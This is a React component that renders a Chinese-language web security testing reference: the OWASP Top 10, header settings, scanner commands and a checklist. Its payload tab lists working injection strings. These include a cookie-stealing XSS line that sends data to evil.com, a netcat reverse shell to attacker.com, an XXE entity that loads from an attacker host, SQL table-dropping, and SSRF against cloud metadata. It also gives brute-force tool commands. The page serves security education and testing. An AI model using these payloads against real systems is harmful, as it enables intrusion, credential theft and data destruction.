import { ToolLayout } from "@/components/ToolLayout";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
import { Shield, AlertTriangle, Bug, Lock, Terminal, HelpCircle, FileText } from "lucide-react";

const HelpTip = ({ content }: { content: string }) => (
  <Tooltip>
    <TooltipTrigger asChild>
      <HelpCircle className="h-3.5 w-3.5 text-muted-foreground hover:text-primary cursor-help inline-block ml-1" />
    </TooltipTrigger>
    <TooltipContent side="top" className="max-w-xs text-xs">
      {content}
    </TooltipContent>
  </Tooltip>
);

const SecurityTestingReference = () => {
  const owaspTop10 = [
    {
      id: "A01",
      name: "访问控制失效",
      description: "用户可以访问未授权的功能或数据",
      help: "最常见的安全漏洞，攻击者通过修改URL、参数或请求绕过权限检查",
      severity: "critical",
      tests: [
        { text: "水平越权测试", help: "尝试用用户A的凭证访问用户B的数据，如修改URL中的用户ID" },
        { text: "垂直越权测试", help: "普通用户尝试访问管理员功能，如直接访问/admin路径" },
        { text: "IDOR测试", help: "不安全的直接对象引用，通过可预测的ID访问他人资源" },
        { text: "目录遍历", help: "使用../等路径访问服务器上的敏感文件" },
        { text: "强制浏览", help: "直接访问未链接但存在的页面如/backup、/.git" },
      ],
    },
    {
      id: "A02",
      name: "加密机制失效",
      description: "敏感数据未加密存储或传输",
      help: "包括密码明文存储、使用弱加密算法、HTTPS配置不当等",
      severity: "critical",
      tests: [
        { text: "HTTPS配置检查", help: "验证是否强制使用HTTPS，证书是否有效" },
        { text: "敏感数据加密验证", help: "检查数据库中密码、信用卡等是否加密存储" },
        { text: "密码哈希算法检查", help: "确认使用bcrypt/argon2而非MD5/SHA1" },
        { text: "API密钥暴露扫描", help: "检查代码和Git历史中是否泄露密钥" },
        { text: "Cookie安全属性", help: "验证Secure、HttpOnly、SameSite属性" },
      ],
    },
    {
      id: "A03",
      name: "注入攻击",
      description: "通过输入恶意数据执行非预期命令",
      help: "攻击者在输入中嵌入恶意代码，被服务器当作命令执行",
      severity: "critical",
      tests: [
        { text: "SQL注入", help: "在输入框中插入SQL语句破坏数据库查询逻辑" },
        { text: "XSS攻击", help: "注入JavaScript代码在用户浏览器中执行" },
        { text: "命令注入", help: "在系统命令参数中插入额外命令" },
        { text: "LDAP注入", help: "篡改LDAP查询获取未授权信息" },
        { text: "NoSQL注入", help: "针对MongoDB等NoSQL数据库的注入攻击" },
      ],
    },
    {
      id: "A04",
      name: "不安全设计",
      description: "设计阶段的安全缺陷",
      help: "代码实现正确但设计本身存在安全隐患",
      severity: "high",
      tests: [
        { text: "业务逻辑漏洞测试", help: "如购物车负数价格、跳过支付步骤等" },
        { text: "威胁建模验证", help: "识别系统中的信任边界和攻击面" },
        { text: "安全需求审查", help: "验证安全需求是否在设计中体现" },
        { text: "数据流分析", help: "追踪敏感数据在系统中的流向" },
      ],
    },
    {
      id: "A05",
      name: "安全配置错误",
      description: "不安全的默认配置",
      help: "使用默认密码、开启调试模式、暴露敏感端点等",
      severity: "high",
      tests: [
        { text: "默认凭据检查", help: "测试admin:admin、root:root等常见默认密码" },
        { text: "错误信息泄露", help: "检查错误页面是否暴露堆栈跟踪等敏感信息" },
        { text: "目录列表暴露", help: "检查是否可以列出服务器目录内容" },
        { text: "不必要的服务/端口", help: "扫描并关闭不需要的网络服务" },
        { text: "HTTP方法测试", help: "检查是否启用了PUT、DELETE、TRACE等危险方法" },
      ],
    },
    {
      id: "A06",
      name: "过时组件",
      description: "使用含有已知漏洞的组件",
      help: "依赖库版本过旧，存在已公开的安全漏洞",
      severity: "medium",
      tests: [
        { text: "npm audit", help: "Node.js项目依赖漏洞扫描" },
        { text: "依赖版本检查", help: "检查是否使用最新稳定版本" },
        { text: "CVE漏洞扫描", help: "对照CVE数据库检查已知漏洞" },
        { text: "软件清单(SBOM)", help: "生成并审查软件物料清单" },
      ],
    },
    {
      id: "A07",
      name: "身份验证失效",
      description: "身份验证和会话管理实现不当",
      help: "弱密码策略、会话劫持、凭证填充等攻击",
      severity: "critical",
      tests: [
        { text: "弱密码策略测试", help: "检查是否允许123456等弱密码" },
        { text: "暴力破解防护", help: "验证是否有登录失败锁定机制" },
        { text: "会话固定攻击", help: "登录前后Session ID是否改变" },
        { text: "会话超时验证", help: "检查空闲会话是否自动过期" },
        { text: "多因素认证", help: "验证MFA实现是否可被绕过" },
        { text: "密码重置流程", help: "检查重置链接是否一次性且有时效" },
      ],
    },
    {
      id: "A08",
      name: "软件和数据完整性失效",
      description: "未验证软件更新和数据完整性",
      help: "CI/CD管道被篡改、依赖包被替换、反序列化攻击等",
      severity: "high",
      tests: [
        { text: "CI/CD管道安全", help: "检查构建流程是否可被恶意修改" },
        { text: "依赖完整性验证", help: "验证npm包是否使用lock文件锁定版本" },
        { text: "反序列化攻击", help: "检查是否安全处理序列化数据" },
        { text: "代码签名验证", help: "验证发布包的数字签名" },
      ],
    },
    {
      id: "A09",
      name: "日志和监控失效",
      description: "缺乏有效的日志记录和监控",
      help: "无法检测和响应安全事件，攻击行为不被记录",
      severity: "medium",
      tests: [
        { text: "安全事件日志检查", help: "验证登录失败、权限变更等是否记录" },
        { text: "告警机制验证", help: "检查异常行为是否触发告警" },
        { text: "日志注入测试", help: "验证日志内容是否被正确转义" },
        { text: "日志保留策略", help: "确认日志保留时间满足合规要求" },
      ],
    },
    {
      id: "A10",
      name: "服务端请求伪造",
      description: "SSRF - 利用服务端发起恶意请求",
      help: "诱导服务器访问内网资源或云元数据接口",
      severity: "high",
      tests: [
        { text: "内网探测测试", help: "尝试让服务器访问内网IP如192.168.x.x" },
        { text: "云元数据访问", help: "尝试访问169.254.169.254获取云凭证" },
        { text: "协议走私测试", help: "使用file://、gopher://等协议绕过限制" },
        { text: "DNS重绑定", help: "通过DNS解析变化绕过IP白名单" },
      ],
    },
  ];

  const injectionPayloads = [
    { 
      type: "SQL注入", 
      help: "通过在用户输入中嵌入SQL代码来操纵数据库查询",
      payloads: [
        { code: "' OR '1'='1", desc: "永真条件绕过认证" },
        { code: "' OR '1'='1' --", desc: "注释掉后续SQL语句" },
        { code: "1; DROP TABLE users--", desc: "删除数据库表（危险）" },
        { code: "' UNION SELECT NULL--", desc: "联合查询探测列数" },
        { code: "' UNION SELECT username,password FROM users--", desc: "提取用户凭证" },
        { code: "1' AND '1'='1", desc: "布尔盲注测试-真" },
        { code: "1' AND '1'='2", desc: "布尔盲注测试-假" },
        { code: "1' AND SLEEP(5)--", desc: "时间盲注测试" },
      ] 
    },
    { 
      type: "XSS跨站脚本", 
      help: "在网页中注入恶意脚本，在用户浏览器中执行",
      payloads: [
        { code: "<script>alert('XSS')</script>", desc: "基础反射型XSS测试" },
        { code: "<img src=x onerror=alert(1)>", desc: "图片错误事件触发" },
        { code: "<svg onload=alert(1)>", desc: "SVG加载事件触发" },
        { code: "javascript:alert(1)", desc: "伪协议（用于href属性）" },
        { code: "<body onload=alert(1)>", desc: "页面加载触发" },
        { code: "<input onfocus=alert(1) autofocus>", desc: "自动聚焦触发" },
        { code: "'-alert(1)-'", desc: "模板字符串注入" },
        { code: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>", desc: "窃取Cookie" },
      ] 
    },
    { 
      type: "命令注入", 
      help: "在系统命令中注入额外命令，控制服务器",
      payloads: [
        { code: "; ls -la", desc: "分号分隔执行新命令" },
        { code: "| cat /etc/passwd", desc: "管道符读取密码文件" },
        { code: "&& whoami", desc: "AND运算符链接命令" },
        { code: "|| id", desc: "OR运算符（前命令失败时执行）" },
        { code: "`id`", desc: "反引号命令替换" },
        { code: "$(whoami)", desc: "$()命令替换" },
        { code: "; nc -e /bin/sh attacker.com 4444", desc: "反弹Shell（危险）" },
      ] 
    },
    { 
      type: "路径遍历", 
      help: "通过../等相对路径访问服务器上的任意文件",
      payloads: [
        { code: "../../../etc/passwd", desc: "Linux密码文件" },
        { code: "....//....//....//etc/passwd", desc: "双写绕过过滤" },
        { code: "..\\..\\..\\windows\\system32\\config\\sam", desc: "Windows SAM文件" },
        { code: "%2e%2e%2f%2e%2e%2f", desc: "URL编码绕过" },
        { code: "....//....//....//etc/shadow", desc: "Linux影子密码文件" },
        { code: "%252e%252e%252f", desc: "双重URL编码绕过" },
        { code: "..%c0%af..%c0%af", desc: "UTF-8编码绕过" },
      ] 
    },
    { 
      type: "SSRF服务端请求伪造", 
      help: "诱导服务器向内部或外部发起恶意请求",
      payloads: [
        { code: "http://127.0.0.1:22", desc: "探测本地SSH端口" },
        { code: "http://169.254.169.254/latest/meta-data/", desc: "AWS元数据（获取IAM凭证）" },
        { code: "http://192.168.1.1/admin", desc: "访问内网管理页面" },
        { code: "file:///etc/passwd", desc: "file协议读取本地文件" },
        { code: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", desc: "Gopher协议攻击Redis" },
        { code: "http://0x7f000001/", desc: "十六进制IP绕过" },
        { code: "http://2130706433/", desc: "十进制IP绕过" },
      ] 
    },
    { 
      type: "XXE外部实体注入", 
      help: "通过XML外部实体读取文件或发起SSRF",
      payloads: [
        { code: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: "读取本地文件" },
        { code: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>', desc: "外部DTD加载" },
        { code: '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">', desc: "PHP源码读取" },
      ] 
    },
    { 
      type: "LDAP注入", 
      help: "篡改LDAP查询条件获取未授权数据",
      payloads: [
        { code: "*)(uid=*))(|(uid=*", desc: "通配符注入" },
        { code: "admin)(&)", desc: "布尔注入" },
        { code: "x)(|(cn=*", desc: "OR条件注入" },
      ] 
    },
  ];

  const securityHeaders = [
    { header: "X-Frame-Options", value: "SAMEORIGIN", description: "防止点击劫持", help: "限制页面只能在同源iframe中嵌入，防止恶意网站嵌入您的页面进行欺骗" },
    { header: "X-Content-Type-Options", value: "nosniff", description: "防止MIME类型嗅探", help: "阻止浏览器猜测响应内容类型，防止将非脚本文件当作脚本执行" },
    { header: "X-XSS-Protection", value: "1; mode=block", description: "浏览器XSS过滤", help: "启用浏览器内置XSS过滤器，检测到攻击时阻止页面加载" },
    { header: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains", description: "强制HTTPS", help: "告诉浏览器只能通过HTTPS访问，防止SSL剥离攻击" },
    { header: "Content-Security-Policy", value: "default-src 'self'; script-src 'self'", description: "内容安全策略", help: "限制资源加载来源，有效防止XSS、数据注入等攻击" },
    { header: "Referrer-Policy", value: "strict-origin-when-cross-origin", description: "控制Referer信息", help: "限制跨域请求时Referer头携带的信息，保护用户隐私" },
    { header: "Permissions-Policy", value: "geolocation=(), camera=(), microphone=()", description: "权限策略", help: "禁用或限制浏览器功能如地理位置、摄像头等" },
    { header: "Cross-Origin-Opener-Policy", value: "same-origin", description: "跨源opener策略", help: "防止跨源窗口获取opener引用，隔离浏览上下文" },
    { header: "Cross-Origin-Resource-Policy", value: "same-origin", description: "跨源资源策略", help: "限制其他源加载本站资源，防止Spectre等侧信道攻击" },
  ];

  const tools = [
    { name: "OWASP ZAP", description: "开源Web漏洞扫描器", help: "功能全面的免费安全测试工具，支持主动/被动扫描、模糊测试", command: "docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.com", category: "扫描器" },
    { name: "Burp Suite", description: "专业渗透测试平台", help: "业界标准的Web安全测试工具，支持代理、扫描、入侵等功能", command: "# GUI工具，需要从portswigger.net下载", category: "扫描器" },
    { name: "Nikto", description: "Web服务器漏洞扫描", help: "快速扫描已知漏洞、配置错误和过时组件", command: "nikto -h https://target.com", category: "扫描器" },
    { name: "SQLMap", description: "自动化SQL注入检测", help: "支持多种数据库的SQL注入检测和利用工具", command: "sqlmap -u 'https://target.com/page?id=1' --dbs --batch", category: "注入" },
    { name: "XSSer", description: "XSS漏洞检测", help: "自动化检测和利用XSS漏洞", command: "xsser -u 'https://target.com/search?q=test'", category: "注入" },
    { name: "Nmap", description: "网络端口扫描", help: "发现开放端口和运行的服务，支持脚本扩展", command: "nmap -sV -sC -A target.com", category: "探测" },
    { name: "Nuclei", description: "模板化漏洞扫描", help: "基于YAML模板的快速漏洞扫描器，社区模板丰富", command: "nuclei -u https://target.com -t cves/ -t vulnerabilities/", category: "扫描器" },
    { name: "Dirsearch", description: "目录和文件枚举", help: "暴力枚举网站目录和文件，发现隐藏资源", command: "dirsearch -u https://target.com -e php,html,js", category: "探测" },
    { name: "Gobuster", description: "目录/子域名枚举", help: "高速目录枚举和DNS子域名爆破工具", command: "gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt", category: "探测" },
    { name: "Subfinder", description: "子域名发现", help: "被动子域名枚举，使用多个数据源", command: "subfinder -d target.com -o subdomains.txt", category: "探测" },
    { name: "testssl.sh", description: "SSL/TLS配置检测", help: "全面检测SSL/TLS配置问题和漏洞", command: "testssl.sh https://target.com", category: "配置" },
    { name: "npm audit", description: "Node.js依赖漏洞检查", help: "扫描package.json中依赖的已知漏洞", command: "npm audit --audit-level=high", category: "依赖" },
    { name: "Snyk", description: "依赖安全扫描", help: "检测开源依赖和容器镜像中的漏洞", command: "snyk test && snyk monitor", category: "依赖" },
    { name: "Trivy", description: "容器安全扫描", help: "扫描容器镜像、文件系统、Git仓库中的漏洞", command: "trivy image your-image:tag", category: "依赖" },
    { name: "Hydra", description: "暴力破解工具", help: "支持多种协议的密码暴力破解", command: "hydra -l admin -P passwords.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", category: "认证" },
    { name: "Hashcat", description: "密码破解", help: "GPU加速的密码哈希破解工具", command: "hashcat -m 0 hashes.txt wordlist.txt", category: "认证" },
  ];

  const checklist = [
    { category: "认证安全", items: [
      { text: "密码复杂度要求", help: "至少8位，包含大小写字母、数字和特殊字符" },
      { text: "账户锁定机制", help: "连续失败5次后锁定账户15分钟" },
      { text: "密码重置安全性", help: "重置链接一次性使用，有效期不超过1小时" },
      { text: "会话管理", help: "Session ID随机生成，登录后重新生成" },
      { text: "多因素认证", help: "敏感操作启用MFA，如支付、密码修改" },
    ]},
    { category: "授权控制", items: [
      { text: "最小权限原则", help: "用户只能访问完成任务所需的最少资源" },
      { text: "RBAC实现", help: "基于角色的访问控制，权限与角色绑定" },
      { text: "API授权检查", help: "每个API端点都验证用户权限" },
      { text: "敏感操作确认", help: "删除、转账等操作需要二次确认" },
    ]},
    { category: "输入验证", items: [
      { text: "服务端验证", help: "永远不信任客户端，所有输入在服务端重新验证" },
      { text: "参数化查询", help: "使用预编译语句防止SQL注入" },
      { text: "输出编码", help: "根据上下文（HTML/JS/URL）正确编码输出" },
      { text: "文件上传限制", help: "验证文件类型、大小，存储在非Web目录" },
    ]},
    { category: "数据保护", items: [
      { text: "传输加密", help: "强制使用TLS 1.2+，HSTS启用" },
      { text: "存储加密", help: "敏感数据AES-256加密，密钥安全管理" },
      { text: "密码哈希", help: "使用bcrypt/argon2，cost factor>=10" },
      { text: "日志脱敏", help: "日志中不记录密码、Token等敏感信息" },
    ]},
  ];

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "destructive";
      case "high": return "destructive";
      case "medium": return "secondary";
      default: return "outline";
    }
  };

  const getSeverityText = (severity: string) => {
    switch (severity) {
      case "critical": return "严重";
      case "high": return "高危";
      case "medium": return "中危";
      default: return "低危";
    }
  };

  return (
    <ToolLayout
      title="安全测试参考"
      description="OWASP Top 10、渗透测试Payload、安全工具速查"
      icon={Shield}
    >
      <Tabs defaultValue="owasp" className="w-full">
        <TabsList className="grid w-full grid-cols-5">
          <TabsTrigger value="owasp" className="flex items-center gap-1 text-xs sm:text-sm">
            <AlertTriangle className="h-4 w-4" />
            <span className="hidden sm:inline">OWASP Top 10</span>
            <span className="sm:hidden">OWASP</span>
          </TabsTrigger>
          <TabsTrigger value="payloads" className="flex items-center gap-1 text-xs sm:text-sm">
            <Bug className="h-4 w-4" />
            <span className="hidden sm:inline">测试Payload</span>
            <span className="sm:hidden">Payload</span>
          </TabsTrigger>
          <TabsTrigger value="headers" className="flex items-center gap-1 text-xs sm:text-sm">
            <Lock className="h-4 w-4" />
            <span className="hidden sm:inline">安全响应头</span>
            <span className="sm:hidden">响应头</span>
          </TabsTrigger>
          <TabsTrigger value="tools" className="flex items-center gap-1 text-xs sm:text-sm">
            <Terminal className="h-4 w-4" />
            <span className="hidden sm:inline">安全工具</span>
            <span className="sm:hidden">工具</span>
          </TabsTrigger>
          <TabsTrigger value="checklist" className="flex items-center gap-1 text-xs sm:text-sm">
            <FileText className="h-4 w-4" />
            <span className="hidden sm:inline">检查清单</span>
            <span className="sm:hidden">清单</span>
          </TabsTrigger>
        </TabsList>

        <TabsContent value="owasp" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="grid gap-4">
              {owaspTop10.map((item) => (
                <Card key={item.id} className="border-border/50">
                  <CardContent className="p-4">
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <Badge variant="outline" className="font-mono">{item.id}</Badge>
                        <h3 className="font-semibold text-foreground">
                          {item.name}
                          <HelpTip content={item.help} />
                        </h3>
                      </div>
                      <Badge variant={getSeverityColor(item.severity)}>
                        {getSeverityText(item.severity)}
                      </Badge>
                    </div>
                    <p className="text-sm text-muted-foreground mb-3">{item.description}</p>
                    <div className="space-y-1">
                      <p className="text-xs font-medium text-muted-foreground">测试要点:</p>
                      <ul className="grid grid-cols-1 md:grid-cols-2 gap-1">
                        {item.tests.map((test, i) => (
                          <li key={i} className="text-sm text-foreground flex items-center gap-2">
                            <span className="w-1.5 h-1.5 rounded-full bg-primary flex-shrink-0" />
                            <span>
                              {test.text}
                              <HelpTip content={test.help} />
                            </span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="payloads" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="grid gap-4">
              {injectionPayloads.map((category) => (
                <Card key={category.type} className="border-border/50">
                  <CardContent className="p-4">
                    <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                      <Bug className="h-4 w-4 text-primary" />
                      {category.type}
                      <HelpTip content={category.help} />
                    </h3>
                    <div className="grid gap-2">
                      {category.payloads.map((payload, i) => (
                        <div key={i} className="flex items-start gap-2">
                          <code className="flex-1 p-2 bg-muted rounded text-sm font-mono text-foreground break-all">
                            {payload.code}
                          </code>
                          <span className="text-xs text-muted-foreground min-w-[100px] pt-2">
                            {payload.desc}
                          </span>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="headers" className="mt-6">
          <Card className="border-border/50">
            <CardContent className="p-4">
              <div className="overflow-x-auto">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-border">
                      <th className="text-left p-3 font-semibold text-foreground">响应头</th>
                      <th className="text-left p-3 font-semibold text-foreground">推荐值</th>
                      <th className="text-left p-3 font-semibold text-foreground">作用</th>
                    </tr>
                  </thead>
                  <tbody>
                    {securityHeaders.map((item) => (
                      <tr key={item.header} className="border-b border-border/50 hover:bg-muted/50">
                        <td className="p-3">
                          <code className="text-primary font-mono">{item.header}</code>
                          <HelpTip content={item.help} />
                        </td>
                        <td className="p-3">
                          <code className="text-muted-foreground font-mono text-xs">{item.value}</code>
                        </td>
                        <td className="p-3 text-muted-foreground">{item.description}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </CardContent>
          </Card>

          <Card className="border-border/50 mt-4">
            <CardContent className="p-4">
              <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                Nginx 配置示例
                <HelpTip content="将这些配置添加到nginx.conf的server块中" />
              </h3>
              <pre className="p-4 bg-muted rounded text-sm font-mono text-foreground overflow-x-auto">
{`add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;

# 隐藏服务器版本信息
server_tokens off;`}
              </pre>
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="tools" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="space-y-6">
              {['扫描器', '注入', '探测', '配置', '依赖', '认证'].map((cat) => (
                <div key={cat}>
                  <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                    <Terminal className="h-4 w-4 text-primary" />
                    {cat}工具
                  </h3>
                  <div className="grid gap-3 md:grid-cols-2">
                    {tools.filter(t => t.category === cat).map((tool) => (
                      <Card key={tool.name} className="border-border/50">
                        <CardContent className="p-4">
                          <div className="flex items-center gap-2 mb-2">
                            <h4 className="font-semibold text-foreground">{tool.name}</h4>
                            <HelpTip content={tool.help} />
                          </div>
                          <p className="text-sm text-muted-foreground mb-3">{tool.description}</p>
                          <pre className="p-3 bg-muted rounded text-xs font-mono text-foreground overflow-x-auto">
                            {tool.command}
                          </pre>
                        </CardContent>
                      </Card>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>

        <TabsContent value="checklist" className="mt-6">
          <ScrollArea className="h-[600px]">
            <div className="grid gap-4 md:grid-cols-2">
              {checklist.map((section) => (
                <Card key={section.category} className="border-border/50">
                  <CardContent className="p-4">
                    <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
                      <Shield className="h-4 w-4 text-primary" />
                      {section.category}
                    </h3>
                    <ul className="space-y-2">
                      {section.items.map((item, i) => (
                        <li key={i} className="flex items-start gap-2 text-sm">
                          <input type="checkbox" className="mt-1 rounded border-border" />
                          <span className="text-foreground">
                            {item.text}
                            <HelpTip content={item.help} />
                          </span>
                        </li>
                      ))}
                    </ul>
                  </CardContent>
                </Card>
              ))}
            </div>
          </ScrollArea>
        </TabsContent>
      </Tabs>
    </ToolLayout>
  );
};

export default SecurityTestingReference;
